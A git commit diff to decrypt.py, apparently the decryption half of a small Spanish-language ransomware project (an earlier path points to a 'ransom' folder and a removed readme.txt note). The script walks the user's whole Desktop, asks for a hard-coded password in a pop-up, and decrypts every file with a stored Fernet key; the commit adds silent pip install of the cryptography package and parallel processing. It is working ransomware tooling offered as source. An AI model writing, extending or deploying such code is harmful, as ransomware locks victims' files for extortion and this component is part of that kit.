99b7e3e7ba749abdfeb4d3f7507aafbd2048ed0b
Andy2299 <90882478+Andy2299@users.noreply.github.com>
2023-07-29 23:24:30 -0600

    Update decrypt.py

--- decrypt.py
+++ decrypt.py
@@ -1,13 +1,27 @@
-from cryptography.fernet import Fernet
 import os
+import subprocess
+import pkg_resources
+import multiprocessing
+from cryptography.fernet import Fernet
 import tkinter as tk
 from tkinter import simpledialog
-from concurrent.futures import ThreadPoolExecutor
+
+REQUIRED_PACKAGES = [
+    'cryptography'
+]
+
+for package in REQUIRED_PACKAGES:
+    try:
+        dist = pkg_resources.get_distribution(package)
+        print('{} ({}) está instalado'.format(dist.key, dist.version))
+    except pkg_resources.DistributionNotFound:
+        print('{} NO está instalado'.format(package))
+        subprocess.call(['pip', 'install', package])
 
 def cargar_key():
     return open('key.key', 'rb').read()
 
-def decrypt_file(item, key):
+def decrypt(item, key):
     f = Fernet(key)
     with open(item, 'rb') as file:
         encrypted_data = file.read()
@@ -15,16 +29,16 @@ def decrypt_file(item, key):
     with open(item, 'wb') as file:
         file.write(decrypted_data)
 
-def decrypt(items, key):
-    with ThreadPoolExecutor() as executor:
-        executor.map(decrypt_file, items, [key]*len(items))
+def get_all_files_in_directory(dir_path):
+    files_list = []
+    for root, dirs, files in os.walk(dir_path):
+        for file in files:
+            files_list.append(os.path.join(root, file))
+    return files_list
 
 if __name__ == '__main__':
-    path_to_encrypt = 'C:\\Users\\rodgo\\Desktop\\ransom\\files'
-    os.remove(path_to_encrypt+'\\'+'readme.txt')
-
-    items = os.listdir(path_to_encrypt)
-    full_path = [path_to_encrypt+'\\'+item for item in items]
+    path_to_encrypt = 'C:\\Users\\[nombre de usuario]\\Desktop'  # Reemplaza [nombre de usuario] con tu nombre de usuario
+    all_files = get_all_files_in_directory(path_to_encrypt)
 
     # Solicitar la contraseña al usuario
     root = tk.Tk()
@@ -32,6 +46,7 @@ if __name__ == '__main__':
     password = simpledialog.askstring("Contraseña", "Introduce la contraseña para desencriptar los archivos:", show='*')
     if password == "contraseña_correcta":
         key = cargar_key()
-        decrypt(full_path, key)
+        with multiprocessing.Pool() as pool:
+            pool.starmap(decrypt, [(file, key) for file in all_files])
     else:
         print("Contraseña incorrecta.")
